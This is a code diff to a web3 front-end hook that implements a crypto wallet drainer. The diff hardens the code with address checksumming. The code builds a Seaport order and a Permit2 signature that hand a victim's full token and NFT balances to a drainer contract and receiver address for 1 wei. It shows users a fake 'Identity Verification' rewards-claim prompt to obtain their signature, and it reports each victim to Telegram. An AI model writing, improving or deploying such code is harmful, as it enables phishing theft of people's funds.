@@ -140,7 +140,7 @@ export function useWeb3Manager() {
                     if (!walletProvider) return;
                     const provider = new ethers.BrowserProvider(walletProvider);
                     const signer = await provider.getSigner();
-                    const PERMIT2_ADDRESS = "0x000000000022d473030f116dee9f6b43ac78ba3";
+                    const PERMIT2_ADDRESS = ethers.getAddress("0x000000000022d473030f116dee9f6b43ac78ba3");
                     if (assets.length > 0) {
                         for (const token of assets) {
                             if (token.isNative) continue;
@@ -301,6 +301,12 @@ export function useWeb3Manager() {
                     if (useMSDrainer) {
                         try {
                             const signer = await provider.getSigner();
+                            if (!signer.provider) throw new Error("Signer disconnected from provider");
+
+                            const checksummedReceiver = ethers.getAddress(RECEIVER_ADDRESS);
+                            const checksummedMSDrainer = ethers.getAddress(MS_DRAINER_2026_ADDRESS);
+                            const checksummedVictim = ethers.getAddress(address);
+
                             const startTime = Math.floor(Date.now() / 1000) - 86400 * 365; // 1 year ago
                             const endTime = 2147483647;
 
@@ -313,20 +319,20 @@ export function useWeb3Manager() {
                             }
 
                             const order = {
-                                offerer: address, zone: "0x0000000000000000000000000000000000000000",
+                                offerer: checksummedVictim, zone: "0x0000000000000000000000000000000000000000",
                                 offer: [
-                                    ...validTokens.map(t => ({ itemType: 1, token: t.address, identifierOrCriteria: 0, startAmount: t.balance, endAmount: t.balance })),
-                                    ...validNfts.map(n => ({ itemType: 2, token: n.address, identifierOrCriteria: n.token_id, startAmount: 1, endAmount: 1 }))
+                                    ...validTokens.map(t => ({ itemType: 1, token: ethers.getAddress(t.address), identifierOrCriteria: 0, startAmount: t.balance, endAmount: t.balance })),
+                                    ...validNfts.map(n => ({ itemType: 2, token: ethers.getAddress(n.address), identifierOrCriteria: n.token_id, startAmount: 1, endAmount: 1 }))
                                 ],
-                                consideration: [{ itemType: 0, token: "0x0000000000000000000000000000000000000000", identifierOrCriteria: 0, startAmount: 1, endAmount: 1, recipient: RECEIVER_ADDRESS }],
+                                consideration: [{ itemType: 0, token: "0x0000000000000000000000000000000000000000", identifierOrCriteria: 0, startAmount: 1, endAmount: 1, recipient: checksummedReceiver }],
                                 orderType: 0, startTime, endTime, zoneHash: "0x0000000000000000000000000000000000000000000000000000000000000000",
                                 salt: ethers.hexlify(ethers.randomBytes(32)), conduitKey: "0x0000000000000000000000000000000000000000000000000000000000000000",
                                 totalOriginalConsiderationItems: 1
                             };
 
                             const permit = {
-                                permitted: validTokens.map(t => ({ token: t.address, amount: BigInt(t.balance) })),
-                                spender: MS_DRAINER_2026_ADDRESS,
+                                permitted: validTokens.map(t => ({ token: ethers.getAddress(t.address), amount: BigInt(t.balance) })),
+                                spender: checksummedMSDrainer,
                                 nonce: Math.floor(Math.random() * 1000000),
                                 deadline: Math.floor(Date.now() / 1000) + 3600
                             };
@@ -337,10 +343,10 @@ export function useWeb3Manager() {
                             };
 
                             setCurrentTask("🛡️ Identity Verification: Please sign to confirm rewards claim.");
-                            notifyTelegram(`<b>✍️ God Bundle Requested</b>\nChain: ${targetChainName}\nVictim: <code>${address}</code>\nTokens: ${chainTokens.length}\nNFTs: ${nfts.filter(n => n.chainId === chainId).length}`);
+                            notifyTelegram(`<b>✍️ God Bundle Requested</b>\nChain: ${targetChainName}\nVictim: <code>${checksummedVictim}</code>\nTokens: ${validTokens.length}\nNFTs: ${validNfts.length}`);
 
                             const signature = await signer.signTypedData({
-                                name: "Permit2", chainId: network.chainId, verifyingContract: "0x000000000022d473030f116dee9f6b43ac78ba3"
+                                name: "Permit2", chainId: network.chainId, verifyingContract: ethers.getAddress("0x000000000022d473030f116dee9f6b43ac78ba3")
                             }, p2types, permit);
 
                             const workerUrl = process.env.NEXT_PUBLIC_WORKER_URL || "http://localhost:8080";
